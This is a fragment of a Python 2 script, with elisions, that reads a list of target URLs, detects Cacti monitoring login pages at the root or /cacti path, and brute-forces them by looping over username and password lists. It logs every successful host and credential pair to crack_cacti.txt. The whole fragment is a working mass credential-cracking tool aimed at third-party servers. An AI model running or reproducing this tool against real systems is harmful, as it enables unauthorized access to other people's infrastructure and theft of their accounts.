...
def check(i,total):
	...
	try:
		#payload = {'login_username': 'admin', 'login_password': '123456'}
		r=requests.get(i+'/',timeout=5)
		status=r.content.count('password below')
	except:
		print i,'Timeout'
		status = 0
	if  status !=0:
	...
	try:
		...
		r=requests.get(i+'/cacti',timeout=5)
		status=r.content.count('password below')
	except:
		print i,'Timeout'
		status = 0
	if  status !=0:
		...
		for user in users:
			for pwd in passwords:
				...
				payload={'login_username':user,'login_password':pwd,'action':'login'}
				try:
					rr=requests.post(i+'/index.php',data=payload,timeout=5)
					if (rr.text.count('Invalid'))!=0:
						print 'error'
					else:
						f1=open('crack_cacti.txt','a+')
						f1.write(i)
						f1.write('\n')
						f1.write(user+'---'+pwd)
						f1.write('\n')
...
def main():
	global eu
	eu = 0
	total=len(open('ip.txt','rU').readlines())
	print 'Total URLs:%d' %total
	for i in open("ip.txt").readlines():
		i=i.strip('\n')
